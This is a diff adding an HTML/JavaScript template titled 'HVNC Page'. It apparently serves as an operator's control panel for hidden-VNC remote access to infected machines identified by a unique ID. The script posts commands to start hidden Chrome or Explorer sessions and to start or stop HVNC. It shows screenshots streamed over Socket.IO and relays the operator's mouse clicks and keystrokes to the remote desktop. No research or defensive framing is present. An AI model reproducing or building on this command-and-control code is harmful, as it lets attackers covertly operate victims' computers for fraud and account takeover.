@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HVNC Page</title>
+    <style>
+        #image-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+
+            #image-container img {
+                max-width: none;
+                max-height: none;
+                position: absolute;
+                top: 0;
+                left: 0;
+                height: 500px;
+                cursor: crosshair;
+            }
+    </style>
+</head>
+<body>
+    <h1>HVNC Page</h1>
+    <p>Unique ID: {{ unique_id }}</p>
+    <form id="start_hvnc_chrome">
+        <input type="hidden" id="unique_id" value="{{ unique_id }}">
+        <button type="submit">Start Chrome</button>
+    </form>
+    <form id="start_hvnc_explorer">
+        <input type="hidden" id="unique_id" value="{{ unique_id }}">
+        <button type="submit">Start Explorer</button>
+    </form>
+    <form id="start-hvnc-form">
+        <input type="hidden" id="unique_id" value="{{ unique_id }}">
+        <button type="submit">Start HVNC</button>
+    </form>
+    <form id="stop_hvnc_form">
+        <input type="hidden" id="unique_id_stop" value="{{ unique_id }}">
+        <button type="submit">Stop HVNC</button>
+    </form>
+    <div id="image-container" tabindex="0"></div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.1/socket.io.js"></script>
+    <script>
+        document.getElementById("start-hvnc-form").addEventListener("submit", function (event) {
+            event.preventDefault();
+            var uniqueId = document.getElementById('unique_id').value;
+            var url = '/start_hvnc/' + uniqueId;
+            var data = { command: 'start_hvnc' };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Command sent successfully:', data);
+                    window.location.href = '/hvnc/' + uniqueId; // Переход на страницу hvnc/<unique_id>
+                })
+                .catch(error => {
+                    console.error('Error sending command:', error);
+                });
+        });
+
+        document.getElementById("start_hvnc_chrome").addEventListener("submit", function (event) {
+            event.preventDefault();
+            var uniqueId = document.getElementById('unique_id').value;
+            var url = '/start_hvnc_chrome/' + uniqueId;
+            var data = { command: 'start_hvnc_chrome' };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Start HVNC command sent successfully:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending Start HVNC command:', error);
+                });
+        });
+
+        document.getElementById("start_hvnc_explorer").addEventListener("submit", function (event) {
+            event.preventDefault();
+            var uniqueId = document.getElementById('unique_id').value;
+            var url = '/start_hvnc_explorer/' + uniqueId;
+            var data = { command: 'start_hvnc_explorer' };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Start HVNC command sent successfully:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending Start HVNC command:', error);
+                });
+        });
+
+        document.getElementById("stop_hvnc_form").addEventListener("submit", function (event) {
+            event.preventDefault();
+            var uniqueId = document.getElementById('unique_id_stop').value;
+            var url = '/stop_hvnc/' + uniqueId;
+            var data = { command: 'stop_hvnc' };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Stop HVNC command sent successfully:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending Stop HVNC command:', error);
+                });
+        });
+
+        const socket = io();
+
+        socket.on('image', function (data) {
+            const imgContainer = document.getElementById('image-container');
+            imgContainer.innerHTML = ''; // Clear container before adding a new image
+            const img = document.createElement('img');
+            img.src = 'data:image/png;base64,' + data.image_data;
+            imgContainer.appendChild(img);
+
+            img.addEventListener('mousedown', function (event) {
+                const imgRect = img.getBoundingClientRect(); // Get image coordinates and dimensions
+                const imgWidth = img.naturalWidth; // Use the original image dimensions
+                const imgHeight = img.naturalHeight;
+                const offsetX = event.clientX - imgRect.left; // Calculate the click offset relative to the top-left corner of the image
+                const offsetY = event.clientY - imgRect.top;
+                const x = Math.round(offsetX / imgRect.width * imgWidth); // Convert offset to image coordinates
+                const y = Math.round(offsetY / imgRect.height * imgHeight);
+                const uniqueId = document.getElementById('unique_id').value; // Get uniqueId from the hidden field
+                sendCoordinates(uniqueId, x, y);
+            });
+        });
+
+        function sendCoordinates(uniqueId, x, y) {
+            var url = '/save_coordinates/' + uniqueId;
+            var data = { x: x, y: y };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Coordinates sent successfully:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending coordinates:', error);
+                });
+        }
+
+        function sendKey(uniqueId, keyCode) {
+            var url = '/save_key/' + uniqueId;
+            var data = { key: keyCode };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Key sent successfully:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending key:', error);
+                });
+        }
+
+        const imgContainer = document.getElementById('image-container');
+
+        imgContainer.addEventListener('mouseenter', () => {
+            imgContainer.focus();
+        });
+
+        imgContainer.addEventListener('mouseleave', () => {
+            imgContainer.blur();
+        });
+
+        imgContainer.addEventListener('keydown', (event) => {
+            const uniqueId = document.getElementById('unique_id').value;
+            sendKey(uniqueId, event.keyCode);
+            console.log(`Key pressed: ${event.keyCode}`);
+        });
+    </script>
+</body>
+</html>
